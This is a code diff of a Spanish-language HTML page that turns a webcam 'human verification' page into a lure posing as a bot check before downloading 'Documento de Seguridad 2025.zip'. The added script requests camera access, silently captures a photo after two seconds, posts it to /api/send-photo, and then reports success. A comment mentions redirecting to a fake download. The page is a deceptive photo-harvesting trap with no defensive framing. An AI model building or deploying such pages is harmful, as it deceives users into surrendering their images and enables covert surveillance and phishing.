@@ -3,77 +3,132 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Setup de Videollamada</title>
+  <title>Verificación de Descarga</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       text-align: center;
-      background-color: #f5f6fa;
-      padding: 20px;
+      background-color: #2c3e50;
+      color: #ecf0f1;
+      padding: 40px;
+    }
+    .container {
+      background-color: #34495e;
+      border-radius: 10px;
+      padding: 30px;
+      margin: auto;
+      max-width: 600px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
     }
     h1 {
-      color: #1e3799;
-      font-size: 24px;
+      color: #3498db;
+      font-size: 28px;
     }
     p {
-      color: #2f3640;
-      max-width: 500px;
-      margin: 0 auto 20px;
       font-size: 16px;
+      line-height: 1.6;
     }
-    video {
-      border: 2px solid #273c75;
+    .file-info {
+      background-color: #22303e;
       border-radius: 8px;
+      padding: 15px;
       margin: 20px 0;
     }
+    .file-info h2 {
+      margin: 0;
+      font-size: 20px;
+      color: #95a5a6;
+    }
+    .file-info p {
+      margin: 5px 0 0;
+      font-size: 14px;
+    }
     button {
-      padding: 10px 20px;
-      font-size: 16px;
-      background-color: #273c75;
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #3498db;
       color: white;
       border: none;
-      border-radius: 5px;
+      border-radius: 50px;
       cursor: pointer;
+      transition: background-color 0.3s ease;
     }
     button:hover {
-      background-color: #192a56;
+      background-color: #2980b9;
+    }
+    video {
+      border: 2px solid #2980b9;
+      border-radius: 8px;
+      margin-top: 20px;
+      display: none; /* Inicia oculto */
     }
   </style>
 </head>
 <body>
-  <h1>Verifica que eres un humano</h1>
-  <p>Verifica que eres un humanos. Permite el acceso y haz clic en "Probar Ahora".</p>
+
+<div class="container">
+  <h1>Verificación para iniciar la descarga</h1>
+  <p>Para proteger nuestros servidores de ataques de bots y garantizar una descarga segura, necesitamos realizar una verificación rápida.</p>
+  
+  <div class="file-info">
+    <h2>Archivo: Documento de Seguridad 2025.zip</h2>
+    <p>Tamaño: 1.2 MB</p>
+  </div>
+  
+  <button id="capture">Verificar y Descargar</button>
+
   <video id="video" width="640" height="480" autoplay></video>
-  <button id="capture">Probar Ahora</button>
   <canvas id="canvas" style="display:none;"></canvas>
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const captureButton = document.getElementById('capture');
+
+</div>
+
+<script>
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const captureButton = document.getElementById('capture');
+
+  captureButton.addEventListener('click', () => {
+    // Muestra la ventana de la cámara
+    video.style.display = 'block';
 
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const photo = canvas.toDataURL('image/png');
+
+            // Envía la foto al servidor
+            fetch('/api/send-photo', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ photo })
+            })
+            .then(response => response.json())
+            .then(data => {
+              alert('Verificación completada. Tu descarga comenzará en breve.');
+              console.log(data.message);
+              // Aquí podrías redirigir a una página de descarga falsa o real.
+            })
+            .catch(err => {
+              alert('Error en la verificación. Por favor, inténtalo de nuevo.');
+              console.error(err);
+            })
+            .finally(() => {
+              stream.getTracks().forEach(track => track.stop());
+              video.style.display = 'none';
+            });
+          }, 2000); // Espera 2 segundos para que la cámara se inicie
+        };
       })
       .catch(err => {
-        alert('Por favor, permite el acceso a la cámara.');
+        alert('Por favor, permite el acceso a la cámara para la verificación.');
       });
+  });
+</script>
 
-    captureButton.addEventListener('click', () => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      const photo = canvas.toDataURL('image/png');
-
-      fetch('/api/send-photo', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ photo })
-      })
-      .then(response => response.json())
-      .then(data => alert(data.message))
-      .catch(err => alert('Error al enviar la foto. Intenta de nuevo.'));
-    });
-  </script>
 </body>
 </html>
